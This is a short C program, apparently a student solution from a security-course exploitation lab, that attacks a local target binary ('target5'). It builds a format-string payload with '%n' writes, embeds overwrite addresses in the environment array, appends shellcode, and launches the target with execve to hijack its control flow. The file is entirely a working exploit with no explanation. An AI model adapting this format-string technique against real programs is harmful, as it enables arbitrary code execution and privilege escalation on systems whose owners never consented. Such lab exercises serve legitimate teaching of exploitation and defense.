#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"
#define DEFAULT_BUFFER_SIZE  4
#define NOP 0x90
#define ZERO 0x00
int main(void)
{
  char *args[3];
  char *env[20	];
  int bsize = DEFAULT_BUFFER_SIZE;
  char* buff, *ptr;	

  int i;
  
	
  int count = 0;

  char * s = "\x68\xfe\xa4\x40";

  args[0] = TARGET; 
  args[1] = s;
  args[2] = NULL;

  char* r = "%x%x%x%x%1084553558x%n";

  env[0] = "\x00";
  env[1] = "\x00";
  env[2] = "\x00";
  env[3] = "AAAAAAA";
  env[4] = "\x69\xfe\xa4\x40";
  env[5] = "\x00";
  env[6] = "\x00";
  env[7] = "\x00";
  env[8] = "AAAAAAA";
  env[9] = "\x70\xfe\xa4\x40";
  env[10] = "\x00";
  env[11] = "\x00";
  env[12] = "\x00";
  env[13] = "AAAAAAA";
  env[14] = "\x71\xfe\xa4\x40";
  env[15] = "\x00";
  env[16] = "\x00";
  env[17] = "\x00";
  env[18] = strcat(shellcode,r);

  char * nop;
   if(!(nop = (char*)malloc(150 * sizeof(char)))){
	  printf("can't allocate memory\n");
	  exit(0);	
  }
  for (i = 0; i<150; i++){
  	nop[i] = 'A';
  }
  
  env[19] = nop;
  

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
